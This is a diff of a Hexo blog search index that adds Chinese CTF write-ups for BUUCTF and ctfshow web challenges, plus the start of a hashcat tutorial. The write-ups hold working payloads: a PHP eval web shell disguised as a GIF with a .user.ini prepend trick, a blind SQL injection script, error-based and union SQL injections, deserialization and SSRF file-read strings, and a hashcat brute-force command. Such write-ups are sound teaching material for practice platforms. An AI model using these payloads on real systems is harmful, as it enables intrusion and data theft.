@@ -1,6 +1,126 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>Buuctf刷题记录(二)</title>
+    <url>/2021/01/21/Buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95-%E4%BA%8C/</url>
+    <content><![CDATA[<h2 id="极客大挑战-2019-BuyFlag"><a class="header-anchor" href="#极客大挑战-2019-BuyFlag">¶</a>[极客大挑战 2019]BuyFlag</h2>
+<p>这题我想多了。。。</p>
+<p>没注意看回显包。。</p>
+<p>看源码发现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">	~~~post money and password~~~</span><br><span class="line">if (isset($_POST[&#39;password&#39;])) &#123;</span><br><span class="line">	$password &#x3D; $_POST[&#39;password&#39;];</span><br><span class="line">	if (is_numeric($password)) &#123;</span><br><span class="line">		echo &quot;password can&#39;t be number&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;elseif ($password &#x3D;&#x3D; 404) &#123;</span><br><span class="line">		echo &quot;Password Right!&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>抓包改一下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120151830712.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>password就是intval这个函数的绕过  user改为1就是构成cuit的条件</p>
+<p>前面说需要100000000元才能买</p>
+<p>现在应该是还缺乏这个条件</p>
+<p>传 money=100000000</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120152207901.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>数字太长 那只能想别的办法了  我用了科学计数法 成功打出了flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120152714775.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>看了师傅们的wp 观察到 php版本大于5.3  感觉是strcmp匹配漏洞。。</p>
+<p>传了个数组 <code>money[]=100000000</code>就过去了  哎我还是太菜了。。</p>
+<h2 id="SUCTF-2019-CheckIn"><a class="header-anchor" href="#SUCTF-2019-CheckIn">¶</a>[SUCTF 2019]CheckIn</h2>
+<p>文件上传的题目</p>
+<p>传一张图片 回显如下</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120153119719.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>发现目录下有 index.php  并且查到是 nginx, 暗示很明显了</p>
+<p>利用user.ini上传</p>
+<p>先上 a.png</p>
+<p>内容为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">&lt;script language&#x3D;&quot;php&quot;&gt;eval($_POST[&#39;flag&#39;]);&lt;&#x2F;script&gt;  </span><br></pre></td></tr></table></figure>
+<p>再上 .user.ini</p>
+<p>内容为</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GIF89a</span><br><span class="line">auto_prepend_file&#x3D;a.png</span><br></pre></td></tr></table></figure>
+<p>直接打出flag</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120154845590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>具体原理我就不再赘述，可以翻一下我之前写的<a href="https://wh1tecell.top/2021/01/16/htaccess%E5%92%8C-user-ini%E6%96%87%E4%BB%B6%E7%9A%84%E5%A6%99%E7%94%A8/">blog</a></p>
+<h2 id="BJDCTF2020-Easy-MD5"><a class="header-anchor" href="#BJDCTF2020-Easy-MD5">¶</a>[BJDCTF2020]Easy MD5</h2>
+<p>回显包发现hint  熟悉的md5 true的sql漏洞</p>
+<p><img src="https://img-blog.csdnimg.cn/20210120155423390.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>密码  <code>ffifdyop</code>  进入下一层</p>
+<p>查看源码发现</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">$a &#x3D; $GET[&#39;a&#39;];</span><br><span class="line">$b &#x3D; $_GET[&#39;b&#39;];</span><br><span class="line"></span><br><span class="line">if($a !&#x3D; $b &amp;&amp; md5($a) &#x3D;&#x3D; md5($b))&#123;</span><br><span class="line">    &#x2F;&#x2F; wow, glzjin wants a girl friend.</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+<p>传参</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?a[]&#x3D;1&amp;b[]&#x3D;2</span><br></pre></td></tr></table></figure>
+<p>进入下一层</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">if($_POST[&#39;param1&#39;]!&#x3D;&#x3D;$_POST[&#39;param2&#39;]&amp;&amp;md5($_POST[&#39;param1&#39;])&#x3D;&#x3D;&#x3D;md5($_POST[&#39;param2&#39;]))&#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>传参 得到flag</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">param1[]&#x3D;1&amp;param2[]&#x3D;2</span><br></pre></td></tr></table></figure>
+<h2 id="ZJCTF-2019-NiZhuanSiWei"><a class="header-anchor" href="#ZJCTF-2019-NiZhuanSiWei">¶</a>[ZJCTF 2019]NiZhuanSiWei</h2>
+<p>源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$text &#x3D; $_GET[&quot;text&quot;];</span><br><span class="line">$file &#x3D; $_GET[&quot;file&quot;];</span><br><span class="line">$password &#x3D; $_GET[&quot;password&quot;];</span><br><span class="line">if(isset($text)&amp;&amp;(file_get_contents($text,&#39;r&#39;)&#x3D;&#x3D;&#x3D;&quot;welcome to the zjctf&quot;))&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&lt;h1&gt;&quot;.file_get_contents($text,&#39;r&#39;).&quot;&lt;&#x2F;h1&gt;&lt;&#x2F;br&gt;&quot;;</span><br><span class="line">    if(preg_match(&quot;&#x2F;flag&#x2F;&quot;,$file))&#123;</span><br><span class="line">        echo &quot;Not now!&quot;;</span><br><span class="line">        exit(); </span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        include($file);  &#x2F;&#x2F;useless.php</span><br><span class="line">        $password &#x3D; unserialize($password);</span><br><span class="line">        echo $password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    highlight_file(__FILE__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>本来用php://input绕过第一个条件 发现text是get型的 所以使用data</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;</span><br></pre></td></tr></table></figure>
+<p>接下来用读取 useless.php</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</span><br></pre></td></tr></table></figure>
+<p>得到源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>最后一步构造反序列化pop链</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">class Flag&#123;  &#x2F;&#x2F;flag.php  </span><br><span class="line">    public $file&#x3D;&quot;flag.php&quot;;  </span><br><span class="line">    public function __tostring()&#123;  </span><br><span class="line">        if(isset($this-&gt;file))&#123;  </span><br><span class="line">            echo file_get_contents($this-&gt;file); </span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">        return (&quot;U R SO CLOSE !&#x2F;&#x2F;&#x2F;COME ON PLZ&quot;);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">$a &#x3D; new Flag();</span><br><span class="line">echo urlencode(serialize($a));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>最终payload：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?text&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,d2VsY29tZSB0byB0aGUgempjdGY&#x3D;&amp;file&#x3D;useless.php&amp;password&#x3D;O%3A4%3A%22Flag%22%3A1%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3B%7D</span><br></pre></td></tr></table></figure>
+<h2 id="CISCN2019-华北赛区-Day2-Web1-Hack-World"><a class="header-anchor" href="#CISCN2019-华北赛区-Day2-Web1-Hack-World">¶</a>[CISCN2019 华北赛区 Day2 Web1]Hack World</h2>
+<p>看题目说是uuid  懂的都懂  肯定是为了我们写脚本快一点爆flag</p>
+<p>fuzz了一下输入框</p>
+<p>过滤了  or ||  *  union 空格</p>
+<p>from  where什么的都没过滤</p>
+<p>这题我用异或</p>
+<p>具体原理:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">1^1&#x3D;0 ，0^0&#x3D;0 ，0^1&#x3D;1</span><br><span class="line">1^1^1&#x3D;1， 1^1^0&#x3D;0</span><br></pre></td></tr></table></figure>
+<p>exp</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;b7139aa2-efde-4532-92d7-e254c04866a0.node3.buuoj.cn&#x2F;index.php&quot;</span><br><span class="line">words &#x3D; &quot;Hello, glzjin wants a girlfriend.&quot;</span><br><span class="line">flag&#x3D;&quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    print(&#39;----------------------------------------------------&#39;)</span><br><span class="line">    for j in range(32,129):</span><br><span class="line">        data&#x3D;&#123;&quot;id&quot;:&quot;1^(if((ascii(substr((select(flag)from(flag)),%d,1))&#x3D;%d),0,1))&quot; %(i,j)&#125;</span><br><span class="line">        re &#x3D; requests.post(url&#x3D;url,data&#x3D;data).text</span><br><span class="line">        if words in re:</span><br><span class="line">            flag+&#x3D;chr(j)</span><br><span class="line">            print(flag)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>
+<p>奇葩的是我第一次跑出来flag是错的。。 数了一下31位。。。果断再跑一遍</p>
+<h2 id="极客大挑战-2019-HardSQL"><a class="header-anchor" href="#极客大挑战-2019-HardSQL">¶</a>[极客大挑战 2019]HardSQL</h2>
+<p>显示登陆成功</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username&#x3D;1&amp;password&#x3D;1&#39;or(0^1)%23</span><br></pre></td></tr></table></figure>
+<p>尝试写了一个盲注脚本  不愧是我 果然跑不出来。。。。</p>
+<p>这里用报错注入，过滤了空格，可以使用括号包裹绕过，= &lt; &gt;也被过滤了，可以使用in语句来绕过</p>
+<p>爆表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(select(database()))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
+<p>爆字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(select(&#39;H4rDsq1&#39;))),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
+<p>爆数据 因为这里flag比较长 所以就用left 和right分别读</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(left(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?username&#x3D;admin&#39;^(updatexml(1,concat(0x7e,(select(right(password,31))from(H4rDsq1)),0x7e),1))%23&amp;password&#x3D;admin</span><br></pre></td></tr></table></figure>
+<p>将结果拼接一下就行了</p>
+<h2 id="网鼎杯-2018-Fakebook"><a class="header-anchor" href="#网鼎杯-2018-Fakebook">¶</a>[网鼎杯 2018]Fakebook</h2>
+<p>打开题目 注册完登录后</p>
+<p>发现存在 sql注入点 手注发现是数字型</p>
+<p>字段数</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;1&#x2F;**&#x2F;order&#x2F;**&#x2F;by&#x2F;**&#x2F;4%23</span><br></pre></td></tr></table></figure>
+<p>读表</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)in(select(database()))),3,4%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210124214639659.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>读字段</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,(select(group_concat(column_name))from(information_schema.columns)where(table_name)in(%27users%27)),3,4%23</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/20210124234357601.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>读字段data的数据</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;-1&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,data,3,4&#x2F;**&#x2F;from fakebook.users%23</span><br></pre></td></tr></table></figure>
+<p>获得一个反序列化字符串？？？</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:18;s:4:&quot;blog&quot;;s:13:&quot;www.baidu.com&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>都忘了这是网鼎杯的题目  怎么可能只考一个知识点。。。</p>
+<h3 id="预期"><a class="header-anchor" href="#预期">¶</a>预期</h3>
+<p>访问robots.txt  发现 user.php.bak 访问得到以下源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class UserInfo</span><br><span class="line">&#123;</span><br><span class="line">    public $name &#x3D; &quot;&quot;;</span><br><span class="line">    public $age &#x3D; 0;</span><br><span class="line">    public $blog &#x3D; &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function __construct($name, $age, $blog)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;name &#x3D; $name;</span><br><span class="line">        $this-&gt;age &#x3D; (int)$age;</span><br><span class="line">        $this-&gt;blog &#x3D; $blog;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get($url)</span><br><span class="line">    &#123;</span><br><span class="line">        $ch &#x3D; curl_init();</span><br><span class="line"></span><br><span class="line">        curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);</span><br><span class="line">        $output &#x3D; curl_exec($ch);</span><br><span class="line">        $httpCode &#x3D; curl_getinfo($ch, CURLINFO_HTTP_CODE);</span><br><span class="line">        if($httpCode &#x3D;&#x3D; 404) &#123;</span><br><span class="line">            return 404;</span><br><span class="line">        &#125;</span><br><span class="line">        curl_close($ch);</span><br><span class="line"></span><br><span class="line">        return $output;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function getBlogContents ()</span><br><span class="line">    &#123;</span><br><span class="line">        return $this-&gt;get($this-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public function isValidBlog ()</span><br><span class="line">    &#123;</span><br><span class="line">        $blog &#x3D; $this-&gt;blog;</span><br><span class="line">        return preg_match(&quot;&#x2F;^(((http(s?))\:\&#x2F;\&#x2F;)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\&#x2F;\S*)?$&#x2F;i&quot;, $blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>get函数非常可疑,存在ssrf的特征代码,对url参数没有任何过滤,根据类中的属性&quot;username&quot;,“age”,“blog”,不难猜想到get函数中传入的参数就是我们注册时候的填写的blog的url地址.</p>
+<p>因为在开始的界面可以看到name、age、blog等信息，此时再看data那里反序列化后的结果，所有的信息都被藏在了data列里，猜测服务器是通过查询data字段,得到其中的序列化信息来渲染整个页面,从而恰好得到页面中的username,age,blog值。在猜想到这个逻辑之后，我们就可以通过修改查询的序列化对象的值来构造ssrf请求,从而读取到flag文件。 利用flie协议读取文件：</p>
+<p>payload:  (这个 flag.php是dir扫出来的)</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?no&#x3D;0 union&#x2F;**&#x2F;select 1,2,3,&#39;O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:4:&quot;test&quot;;s:3:&quot;age&quot;;i:12;s:4:&quot;blog&quot;;s:29:&quot;file:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php&quot;;&#125;&#39; %23</span><br></pre></td></tr></table></figure>
+<h3 id="非预期"><a class="header-anchor" href="#非预期">¶</a>非预期</h3>
+<p>我们通过常规sql注入得到的用户是root,这个用户权限非常高,可以直接读取文件.</p>
+<p>mysql中有一个load_file()函数,这个函数可以读取本地文件,但是有两个条件:</p>
+<p>1.用户有很高的权限</p>
+<p>2.知道文件的绝对路径</p>
+<p>好巧不巧的是这两个条件我们都具备了,上面说了,在sql注入时直接爆出了文件的绝对路径,结合第一步扫描时直接扫除了flag.php,所以尝试是否通过sql注入直接读取flag.php</p>
+<p><img src="https://img-blog.csdnimg.cn/20210125192434994.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NTc4NTI4OA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>参考:<a href="https://troyess.com/2020/07/04/%E7%BD%91%E9%BC%8E%E6%9D%AF-2018-Fakebook/">https://troyess.com/2020/07/04/网鼎杯-2018-Fakebook/</a></p>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>buuctf</category>
+      </categories>
+  </entry>
+  <entry>
     <title>CTF中常见的黑魔法</title>
     <url>/2020/10/20/CTF%E4%B8%AD%E5%B8%B8%E8%A7%81%E7%9A%84%E9%BB%91%E9%AD%94%E6%B3%95/</url>
     <content><![CDATA[<p>本文也可以说是常见php特性考察的总结</p>
@@ -78,6 +198,45 @@
       <categories>
         <category>web技术学习</category>
         <category>常见黑魔法</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>DJBCTF之web</title>
+    <url>/2021/01/25/DJBCTF%E4%B9%8Bweb/</url>
+    <content><![CDATA[<h2 id="veryphp"><a class="header-anchor" href="#veryphp">¶</a>veryphp</h2>
+<p>源码如下</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&quot;config.php&quot;);</span><br><span class="line">class qwq</span><br><span class="line">&#123;</span><br><span class="line">    function __wakeup()&#123;</span><br><span class="line">        die(&quot;Access Denied!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    static function oao()&#123;</span><br><span class="line">        show_source(&quot;config.php&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$str &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">if(preg_match(&#39;&#x2F;\&#96;|\_|\.|%|\*|\~|\^|\&#39;|\&quot;|\;|\(|\)|\]|g|e|l|i|\&#x2F;&#x2F;is&#39;,$str))&#123;</span><br><span class="line">    die(&quot;I am sorry but you have to leave.&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    extract($_POST);</span><br><span class="line">&#125;</span><br><span class="line">if(isset($shaw_root))&#123;</span><br><span class="line">    if(preg_match(&#39;&#x2F;^\-[a-e][^a-zA-Z0-8]&lt;b&gt;(.*)&gt;&#123;4&#125;\D*?(abc.*?)p(hp)*\@R(s|r).$&#x2F;&#39;, $shaw_root)&amp;&amp; strlen($shaw_root)&#x3D;&#x3D;&#x3D;29)&#123;</span><br><span class="line">        echo $hint;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        echo &quot;Almost there.&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;.&quot;Input correct parameters&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if($ans&#x3D;&#x3D;&#x3D;$SecretNumber)&#123;</span><br><span class="line">    echo &quot;&lt;br&gt;&quot;.&quot;Congratulations!&quot;.&quot;&lt;br&gt;&quot;;</span><br><span class="line">    call_user_func($my_ans);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Input correct parameters</span><br></pre></td></tr></table></figure>
+<p>第一步绕过正则 (建议直接使用burp )  注意 下划线被过滤了  可以使用空格  加号或者中括号 php会把它们解析为下划线</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shaw+root&#x3D;-a9&lt;b&gt;111111111&gt;&gt;&gt;&gt;abcphp@Rsz</span><br></pre></td></tr></table></figure>
+<p>得到hint</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Here is a hint : md5(&quot;shaw&quot;.($SecretNumber).&quot;root&quot;)&#x3D;&#x3D;166b47a5cb1ca2431a0edfcef200684f &amp;&amp; strlen($SecretNumber)&#x3D;&#x3D;&#x3D;5</span><br></pre></td></tr></table></figure>
+<p>用hashcat爆破  SecretNumber</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat-5.1.0&gt;hashcat64.exe -a 3 -m 0 166b47a5cb1ca2431a0edfcef200684f shaw?d?d?d?d?droot</span><br></pre></td></tr></table></figure>
+<p>最后 call_user_func函数 用::调用静态方法</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">shaw+root&#x3D;-a9&lt;b&gt;111111111&gt;&gt;&gt;&gt;abcphp@Rsz&amp;ans&#x3D;21475&amp;my+ans&#x3D;qwq::oao</span><br></pre></td></tr></table></figure>
+<h2 id="spaceman"><a class="header-anchor" href="#spaceman">¶</a>spaceman</h2>
+<p>源码</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">class spaceman</span><br><span class="line">&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($username,$password)</span><br><span class="line">    &#123;</span><br><span class="line">        $this-&gt;username &#x3D; $username;</span><br><span class="line">        $this-&gt;password &#x3D; $password;</span><br><span class="line">    &#125;</span><br><span class="line">    public function __wakeup()</span><br><span class="line">    &#123;</span><br><span class="line">        if($this-&gt;password&#x3D;&#x3D;&#x3D;&#39;ctfshowvip&#39;)</span><br><span class="line">        &#123;</span><br><span class="line">            include(&quot;flag.php&quot;);</span><br><span class="line">            echo $flag;    </span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#39;wrong password&#39;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function filter($string)&#123;</span><br><span class="line">    return str_replace(&#39;ctfshowup&#39;,&#39;ctfshow&#39;,$string);</span><br><span class="line">&#125;</span><br><span class="line">$str &#x3D; file_get_contents(&quot;php:&#x2F;&#x2F;input&quot;);</span><br><span class="line">if(preg_match(&#39;&#x2F;\_|\.|\]|\[&#x2F;is&#39;,$str))&#123;            </span><br><span class="line">    die(&quot;I am sorry but you have to leave.&quot;);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    extract($_POST);</span><br><span class="line">&#125;</span><br><span class="line">$ser &#x3D; filter(serialize(new spaceman($user_name,$pass_word)));</span><br><span class="line">$test &#x3D; unserialize($ser);</span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<h3 id="预期解"><a class="header-anchor" href="#预期解">¶</a>预期解</h3>
+<p>反序列化字符逃逸</p>
+<p>正常的反序列化结果:</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">O:8:&quot;spaceman&quot;:2:&#123;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>filter函数会将  ctfshowup替换成ctfshow  也就是减少了两个字符</p>
+<p>可以肯定的是 我们pass word传的肯定是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<p>我们需要吃掉的字符串是  这22个字符</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">s:8:&quot;password&quot;;s:35:</span><br></pre></td></tr></table></figure>
+<p>所以传入username11个 ctfshowup就行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup</span><br></pre></td></tr></table></figure>
+<p>payload</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user+name&#x3D;ctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowupctfshowup&amp;pass+word&#x3D;;s:8:&quot;password&quot;;s:10:&quot;ctfshowvip&quot;;&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="非预期"><a class="header-anchor" href="#非预期">¶</a>非预期</h3>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">user name&#x3D;1&amp;pass word&#x3D;ctfshowvip</span><br></pre></td></tr></table></figure>
+]]></content>
+      <categories>
+        <category>刷题站</category>
+        <category>ctfshow</category>
       </categories>
   </entry>
   <entry>
@@ -571,6 +730,64 @@ payload: cat flag.php||</p>
       </categories>
   </entry>
   <entry>
+    <title>hashcat安装及其使用教程</title>
+    <url>/2021/01/25/hashcat%E5%AE%89%E8%A3%85%E5%8F%8A%E5%85%B6%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/</url>
+    <content><![CDATA[<h3 id="hashcat简介"><a class="header-anchor" href="#hashcat简介">¶</a>hashcat简介</h3>
+<p><strong>hashcat是一款自称为世界上最快的密码破解工具。</strong></p>
+<h3 id="hashcatt安装"><a class="header-anchor" href="#hashcatt安装">¶</a>hashcatt安装</h3>
+<p>把github上面的源码down到本地：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hashcat&#x2F;hashcat.git</span><br></pre></td></tr></table></figure>
+<p>生成项目：</p>
